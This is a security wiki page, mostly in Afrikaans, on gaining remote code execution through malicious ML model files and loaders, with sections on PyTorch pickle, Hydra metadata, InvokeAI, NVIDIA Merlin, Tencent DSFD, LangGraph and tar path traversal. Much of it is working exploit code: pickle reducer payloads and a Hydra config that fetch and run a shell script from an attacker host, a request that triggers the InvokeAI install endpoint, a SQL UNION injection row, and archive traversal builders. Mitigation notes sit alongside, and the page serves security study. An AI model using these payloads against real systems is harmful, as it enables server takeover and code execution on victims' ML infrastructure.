# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models word gewoonlik gedeel in verskillende formate, soos ONNX, TensorFlow, PyTorch, ens. Hierdie models kan op ontwikkelaars se masjiene of produksie-stelsels gelaai word om hulle te gebruik. Gewoonlik behoort die models nie kwaadwillige code te bevat nie, maar daar is sommige gevalle waar die model gebruik kan word om arbitrêre code op die stelsel uit te voer as bedoelde feature of as gevolg van ’n vulnerability in die model loading library.

Ten tyde van die skrywe is dit van die voorbeelde van hierdie tipe vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in model checkpoint lei tot code execution (deur `weights_only` safeguard te omseil)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige model download veroorsaak code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Ongeloofde checkpoint triggere pickle reducer tydens `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injecteer SQL/JSON-path syntax, `UNION SELECT` fabriseer ’n fake checkpoint row, dan `msgpack` deserialization import en roep attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML gebruik `yaml.unsafe_load` (code exec) <br> Loading model met **Lambda** layer run arbitrêre Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Gemaakte `.tflite` model triggere integer overflow → heap corruption (potensiële RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading ’n model via `joblib.load` execute pickle met attacker se `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` standaard het pickled object arrays toegelaat – kwaadwillige `.npy/.npz` triggere code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model se external-weights path kan directory ontsnap (lees arbitrêre files) <br> Kwaadwillige ONNX model tar kan arbitrêre files oorskryf (wat lei tot RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model met custom operator vereis loading van attacker se native code; komplekse model graphs abuse logic om onbedoelde computations uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Gebruik van model-load API met `--model-control` enabled laat relative path traversal toe om files te skryf (bv. `.bashrc` oorskryf vir RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Verkeerd gevormde GGUF model file veroorsaak heap buffer overflows in parser, wat arbitrêre code execution op victim system moontlik maak                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Kwaadwillige HDF5 (`.h5`) model met Lambda layer code execute steeds op load (Keras safe_mode dek nie ou format nie – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Baie ML tools (bv. pickle-gebaseerde model formate, Python `pickle.load`) sal arbitrêre code execute wat in model files ingebed is tensy gemitigeer | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config stel `_target_` na arbitrêre callable (bv. `builtins.exec`) → uitgevoer tydens load, selfs met “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Verder is daar sommige python pickle gebaseerde models soos die een wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word wat gebruik kan word om arbitrêre code op die stelsel uit te voer as hulle nie met `weights_only=True` gelaai word nie. Dus kan enige pickle gebaseerde model veral vatbaar wees vir hierdie tipe attacks, selfs al word hulle nie in die tabel hierbo gelys nie.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` import en roep enige dotted `_target_` in ’n configuration/metadata object. Wanneer libraries **untrusted model metadata** in `instantiate()` voer, kan ’n attacker ’n callable en arguments voorsien wat onmiddellik tydens model load loop (geen pickle nodig).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Sleutel punte:
- Geaktiveer voor model-initialisering in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, en FlexTok loaders.
- Hydra se string block-list kan omseil word via alternatiewe import paths (bv. `enum.bltns.eval`) of toepassing-opgeloste name (bv. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok ontleed ook stringified metadata met `ast.literal_eval`, wat DoS (CPU/geheue blowup) moontlik maak voor die Hydra-call.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde oopbron webinterface vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-endpoint `/api/v2/models/install` bloot wat gebruikers toelaat om models vanaf arbitrêre URLs af te laai en te laai.

Intern roep die endpoint uiteindelik aan:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die verskafte lêer ’n **PyTorch-checkpoint (`*.ckpt`)** is, voer `torch.load` ’n **pickle-deserialisering** uit. Omdat die inhoud direk van die user-controlled URL af kom, kan ’n attacker ’n kwaadwillige objek met ’n custom `__reduce__`-metode binne die checkpoint insluit; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI-server.

Die vulnerability is toegewys aan **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Skep ’n kwaadwillige checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` op 'n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Trigger die kwesbare endpoint (geen verifikasie vereis nie):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system` gadget hardloop en die aanvaller kry code execution in die konteks van die InvokeAI process.

Klaargemaakte exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` bereikbaar deur die aanvaller
•  Process het permissions om shell commands uit te voer

#### Mitigations

* Upgrade na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` by default en voer malware scanning uit voor deserialization.
* Wanneer checkpoints programmatically gelaai word, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures vir model sources en hardloop die service met least-privilege.

> ⚠️ Onthou dat **enige** Python pickle-based format (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth` files) inherent unsafe is om te deserialize vanaf untrusted sources.

---

Example van ’n ad-hoc mitigation as jy ouer InvokeAI weergawes agter ’n reverse proxy moet aanhou laat loop:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige checkpoint-laaier blootgestel wat direk `torch.load()` op deur-die-gebruiker-verskafde paaie geroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan ’n aanvaller-beheerde checkpoint arbitrêre kode via ’n reducer tydens deserialisasie uitvoer.

Kwetsbare pad (voor-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit lei tot RCE: In Python pickle kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n callable en argumente teruggee. Die callable word tydens unpickling uitgevoer. As so ’n objek in ’n checkpoint teenwoordig is, hardloop dit voordat enige weights gebruik word.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models gedeel via repos, buckets, of artifact registries
- Geoutomatiseerde resume/deploy pipelines wat checkpoints outomaties laai
- Execution vind plaas binne training/inference workers, dikwels met verhoogde privileges (bv. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met 'n restricted, allow-listed deserializer geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer types/fields en voorkom dat arbitrary callables tydens load aangeroep word.

Defensive guidance spesifiek vir PyTorch checkpoints:
- Do not unpickle untrusted data. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX wanneer moontlik.
- As jy PyTorch serialization moet gebruik, maak seker `weights_only=True` (ondersteun in nuwer PyTorch) of gebruik 'n custom allow-listed unpickler soortgelyk aan die Transformers4Rec patch.
- Enforce model provenance/signatures en sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS en no network egress).
- Monitor vir unexpected child processes van ML services tydens checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel ’n `resnet`-eindpunt bloot wat deur die gebruiker beheerde data deserialiseer. ZDI het bevestig dat ’n afgeleë aanvaller ’n slagoffer kan dwing om ’n kwaadwillige bladsy/lêer te laai, dit kan laat ’n saamgestelde geserialiseerde blob na daardie eindpunt stuur, en deserialisasie as `root` kan aktiveer, wat lei tot volledige kompromie.

Die exploit-vloei weerspieël tipiese pickle-misbruik:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Enige gadget wat tydens deserialisasie bereik kan word (constructors, `__setstate__`, framework callbacks, ens.) kan op dieselfde manier gewapen word, ongeag of die transport HTTP, WebSocket, of ’n file in ’n watched directory was.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie attack chain is interessant omdat die attacker **nie ’n malicious model file hoef te upload nie**. In plaas daarvan stel die application ’n **AI-agent persistence API** (`get_state_history(..., filter=...)`) bloot en user input bereik die checkpointer query builder.

#### 1. Structural SQLi in metadata filters

’n Vulnerable SQLite pattern het soos volg gelyk:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Die waarde word later gebind, maar `query_key` word in die **JSON path string** saamgevoeg, so `n `'` binne die dictionary key breek uit van `'$.{query_key}'` en spuit SQL in. Dieselfde les geld vir **JSON paths, identifiers, operators, `LIMIT`, en TTL fields**: placeholders beskerm net values, nie structural query syntax nie.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

Die query gee `type` en serialized `checkpoint` bytes terug, wat later as volg verbruik word:
```python
self.serde.loads_typed((type, checkpoint))
```
Dit beteken dat ’n SQLi in die `WHERE`-klousule ’n **vals resultaatry** kan inspuit:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
As later code enige geselekteerde kolom parse, deserialiseer, skryf, of uitvoer, map daardie kolomme na hul sinks. In hierdie geval verander die fake row SQLi in **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks is equivalent to code gadgets

LangGraph se `msgpack` pad het 'n custom extension hook gebruik wat 'n geneste tuple uitgepak en uitgevoer het:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
So ’n MessagePack-uitbreiding-objek-kodering wat iets ekwivalent aan `("os", "system", "id > /tmp/pwned")` voorstel, importeer `os`, los `system` op, en voer die opdrag uit. Wanneer jy AI-frameworks hersien, inspekteer **custom MessagePack/JSON/pickle revivers** vir dinamiese imports, reflection, of arbitrary callable dispatch.

#### 4. Practical audit pattern for agent frameworks

Hersien enige user-controlled input wat na die volgende vloei:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders wat SQL- of Redis query-fragmente genereer
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths wat rows vertrou wat vanaf die persistence layer teruggestuur word

Hierdie spesifieke chain het self-hosted LangGraph deployments met **SQLite** of **Redis** checkpointers geraak wanneer untrusted users `filter` kon beheer. Gepatchte weergawes wat in die disclosure genoem is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, en `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Soos opgemerk in [**hierdie blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), is die meeste models formate wat deur verskillende AI-frameworks gebruik word, gebaseer op archives, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om path traversal attacks uit te voer, wat dit moontlik maak om arbitrary files vanaf die stelsel waar die model gelaai word, te lees.

Byvoorbeeld, met die volgende code kan jy ’n model skep wat ’n file in die `/tmp` directory sal skep wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy ’n model skep wat ’n simboliese skakel na die `/tmp`-gids sal skep wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization en gadget hunting

Vir 'n gefokusde gids oor .keras internals, Lambda-layer RCE, die arbitrary import issue in ≤ 3.8, en post-fix gadget discovery binne die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
